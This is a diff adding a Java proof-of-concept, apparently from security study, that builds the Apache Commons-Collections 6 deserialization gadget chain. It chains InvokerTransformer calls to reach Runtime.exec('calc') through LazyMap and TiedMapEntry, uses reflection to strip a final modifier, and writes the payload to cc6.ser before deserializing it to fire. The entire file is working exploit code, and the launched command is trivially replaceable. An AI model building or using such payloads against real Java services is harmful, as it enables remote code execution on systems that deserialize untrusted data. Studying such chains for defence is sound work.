@@ -1,0 +1,70 @@
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.Modifier;
+import java.util.HashMap;
+import java.util.Map;
+
+
+public class CC6TiedMapEntry2 extends AbstractTranslet {
+    public CC6TiedMapEntry2() throws Exception {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap<Object, Object> map = new HashMap<>();
+        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer("godown"));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test1");
+        HashMap<Object, Object> hashMap = new HashMap<>();
+        hashMap.put(tiedMapEntry, "test2");
+        map.remove("test1");
+        Class lazymapClass = lazyMap.getClass();
+        Field factory = lazymapClass.getDeclaredField("factory");
+        factory.setAccessible(true);
+        Field modifiersField = Field.class.getDeclaredField("modifiers");
+        modifiersField.setAccessible(true);
+        modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
+        factory.set(lazyMap, chainedTransformer);
+        serialize(hashMap);
+        unserialize("cc6.ser");
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+
+    public static void serialize(Object obj) throws Exception {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
+        oos.writeObject(obj);
+        oos.close();
+    }
+    public static Object unserialize(String filename) throws Exception {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
+        Object obj = ois.readObject();
+        ois.close();
+        return obj;
+    }
+}
